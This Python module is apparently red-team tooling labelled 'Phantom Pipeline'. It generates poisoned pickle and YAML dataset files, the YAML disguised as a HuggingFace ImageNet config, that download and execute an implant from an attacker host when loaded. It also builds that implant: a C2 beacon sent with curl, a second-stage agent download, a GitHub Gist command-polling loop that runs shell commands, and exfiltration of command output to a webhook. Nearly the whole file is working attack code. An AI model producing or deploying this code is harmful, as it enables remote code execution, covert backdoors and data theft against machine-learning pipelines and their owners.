"""
Dataset Poisoning — Initial Access (T1059.006)

Generates a malicious pickle or YAML file that executes a stager
when loaded by an unsuspecting data pipeline.

Usage:
    python -m attacker.techniques.dataset_poison --output /tmp/imagenet_labels.pkl
    python -m attacker.techniques.dataset_poison --vector yaml --output /tmp/dataset_config.yaml
"""

import argparse
import pickle
import subprocess
import sys
import os


class _PickleStager:
    """Pickle payload that fetches and executes implant on deserialization."""

    def __init__(self, attacker_host: str, attacker_port: int = 8080):
        self.attacker_host = attacker_host
        self.attacker_port = attacker_port

    def __reduce__(self):
        stager = (
            f"import urllib.request,os,sys;"
            f"urllib.request.urlretrieve("
            f"'http://{self.attacker_host}:{self.attacker_port}/implant.py',"
            f"'/tmp/.cache_ds.py');"
            f"exec(open('/tmp/.cache_ds.py').read())"
        )
        return (subprocess.Popen, (["python3", "-c", stager],))


def generate_pickle(output_path: str, attacker_host: str, attacker_port: int = 8080) -> str:
    """Generate malicious pickle file."""
    payload = _PickleStager(attacker_host, attacker_port)
    with open(output_path, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Malicious pickle generated: {output_path}")
    print(f"    Trigger: pickle.load(open('{output_path}', 'rb'))")
    print(f"    Fetches implant from: http://{attacker_host}:{attacker_port}/implant.py")
    return output_path


def generate_yaml(output_path: str, attacker_host: str, attacker_port: int = 8080) -> str:
    """Generate malicious YAML config (PyYAML unsafe_load exploitation)."""
    payload = f"""# HuggingFace Dataset Configuration
# Dataset: imagenet-1k-labels
# Version: 2.1.0
# Format: classification

metadata:
  name: imagenet-1k
  version: 2.1.0
  description: ImageNet 1K label mapping

# Pipeline configuration
pipeline: !!python/object/apply:subprocess.check_output
  args:
    - - python3
      - -c
      - >-
        import urllib.request,os;
        urllib.request.urlretrieve(
        'http://{attacker_host}:{attacker_port}/implant.py',
        '/tmp/.cache_ds.py');
        exec(open('/tmp/.cache_ds.py').read())
"""
    with open(output_path, "w") as f:
        f.write(payload)
    print(f"[+] Malicious YAML generated: {output_path}")
    print(f"    Trigger: yaml.unsafe_load(open('{output_path}'))")
    print(f"    Fetches implant from: http://{attacker_host}:{attacker_port}/implant.py")
    return output_path


def generate_implant(attacker_host: str, attacker_port: int = 8080, gist_id: str = "", webhook_url: str = "") -> str:
    """
    Generate the implant script served by attacker HTTP server.
    This is what gets downloaded and exec()'d on the victim.
    Returns the Python source as a string (write to ./implant.py to serve).
    """
    return f"""import urllib.request, json, base64, time, subprocess, os

GIST_ID = "{gist_id}"
WEBHOOK = "{webhook_url}"

# Signal beacon back to C2
try:
    subprocess.Popen(
        ["curl", "-s", "-X", "POST", "http://{attacker_host}:{attacker_port}/beacon",
         "-d", f"host={{os.uname().nodename}}"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
except Exception:
    pass

# Launch Shadow Replay telemetry agent
try:
    urllib.request.urlretrieve(
        'http://{attacker_host}:{attacker_port}/agent_linux.py',
        '/tmp/.sr_agent.py'
    )
    subprocess.Popen(
        ['python3', '/tmp/.sr_agent.py', '--server', 'http://{attacker_host}:4444'],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
except Exception:
    pass

# Poll GitHub Gist for commands
while True:
    try:
        req = urllib.request.Request(
            f"https://api.github.com/gists/{{GIST_ID}}",
            headers={{"User-Agent": "python-requests/2.31.0"}}
        )
        resp = json.loads(urllib.request.urlopen(req, timeout=10).read())
        cmd = base64.b64decode(list(resp["files"].values())[0]["content"]).decode().strip()
        if cmd and cmd != "WAIT":
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
            urllib.request.urlopen(urllib.request.Request(
                WEBHOOK,
                data=base64.b64encode(out),
                headers={{"Content-Type": "application/octet-stream",
                         "X-Host": os.uname().nodename}}
            ), timeout=10)
    except Exception:
        pass
    time.sleep(30)
"""


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phantom Pipeline — Dataset Poisoning PoC")
    parser.add_argument("--vector", choices=["pickle", "yaml"], default="pickle")
    parser.add_argument("--output", default="/tmp/imagenet_labels.pkl")
    parser.add_argument("--attacker-host", default="10.4.60.21",
                        help="Attacker IP or domain (e.g. 10.4.60.21 or c2.example.com)")
    parser.add_argument("--attacker-port", type=int, default=8080)
    args = parser.parse_args()

    if args.vector == "pickle":
        generate_pickle(args.output, args.attacker_host, args.attacker_port)
    else:
        generate_yaml(args.output, args.attacker_host, args.attacker_port)
